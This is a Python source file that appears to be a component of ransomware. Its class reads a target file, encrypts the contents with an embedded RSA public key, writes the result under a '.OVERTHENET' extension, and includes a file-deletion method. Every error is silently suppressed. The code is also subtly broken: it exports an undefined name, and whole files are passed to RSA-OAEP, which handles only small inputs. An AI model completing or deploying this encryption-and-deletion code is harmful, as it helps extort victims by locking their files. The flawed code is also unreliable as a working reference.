import os,base64
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
from src._loggingfile import *

__all__ = ["ENCFILE"]

#EXAMPLE

class ENCFILEEXP(object):
    def __new__(cls,tardat:str,pblkey:str):
        rb = object.__new__(cls)
        return rb
    def __init__(self,tardat:str,pblkey:str):
        self.__td = tardat
        self.__pk = pblkey
        self.__ex = ".OVERTHENET"
        self.__cd = os.getcwd()
        self.__pd = os.path.dirname(self.__cd)
        self.__mx = 0xFFFF
        self.__rd = None
        self.__bd = None
    def __str__(self):
        return "ENCRYPTION FILES - PROCESS"
    def __call__(self):
        return
    def __getstate__(self):
        raise TypeError("D.E.N.I.E.D")
    def __repr__(self):
        return ENCFILE.__doc__
    def _REMOVE_DATA(self,inf):
        os.remove(inf)
    def _BD64(self):
        return base64.b64decode(self.__pk)
    def _ENCKEY(self,indat):
        try:
            if len(indat) != 0 and indat != None:
                self.__pk = self._BD64()
                kt = RSA.import_key(self.__pk)
                ch = PKCS1_OAEP.new(kt)
                ct = ch.encrypt(indat)
                return ct
            else:
                pass
        except KeyboardInterrupt:
            raise UserWarning("CLOSED BY USER")
        except Exception as err:
            # print(str(err))
            pass
    def _ENCSAVE(self,ct,ex):
        try:
            sf = self.__td.split(ex)[0].replace(".","")
            ef = sf+self.__ex
            with LOGSAVEFILE(ef) as ff:
                ff._SAVEIN(ct)
        except KeyboardInterrupt:
            raise UserWarning("CLOSED BY USER")
        except Exception as err:
            # print(str(err))
            pass
    def _LAUNCH(self):
        try:
            ex = self.__td.split(".")[-1].lower()
            fo = open(self.__td,"rb")
            self.__rd = fo.read()
            fo.close()
            self.__bd = bytes(self.__rd)
            ct = self._ENCKEY(self.__bd)
            self._ENCSAVE(ct,ex)
        except KeyboardInterrupt:
            raise UserWarning("CLOSED BY USER")
        except:
            pass